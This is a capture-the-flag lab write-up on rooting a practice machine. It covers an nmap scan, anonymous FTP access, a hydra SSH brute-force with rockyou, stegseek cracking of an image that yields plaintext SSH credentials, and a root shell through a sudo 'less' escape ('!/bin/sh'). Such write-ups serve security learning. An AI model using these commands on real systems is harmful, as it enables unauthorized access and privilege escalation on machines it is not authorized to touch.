initial network enumeration
```shell
nmap -sS 10.10.235.53
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 22:14 IST
Nmap scan report for 10.10.235.53
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.00 seconds
```

lets see each one of it
ftp
we can do Anonymous login and boom we have a note for us
it says that jake has a weak password and we can try ssh and crack the password using hydra
```shell
hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.235.53 ssh -I
```

we also got a hint while analyzing the webpage that we have something in comments that said something about stegnography, so i downloaded an image and we can use stegseek to crack the hidden image as we dont know the passphrase
```shell
stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt out.txt
```
boom we got a note containing the direct ssh creds of username = "holt" and the password = "fluffydog12@ninenine"

we can now ssh using the creds and boom we got ssh into as a normal user and we also got the user.txt flag

now analyzing the user i found nothing that i can use to escalate the privilages
so no worries we have another user and we cracked the password, so lets use those creds to get ssh as jake, we got in as jake and see all the files we see that jake can get sudo
```shell
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

and it also has a file sudo as a admin in his directory
```shell
-rw-r--r-- 1 jake jake    0 May 17  2020 .sudo_as_admin_successful
```

so lets search if we can find something on GTFO Bins on less 
and we can execute the command as sudo 
```bash
sudo less /etc/profile
!/bin/sh
```

and boom we got in as a root and also we have the root.txt 

We have succesfully solved the room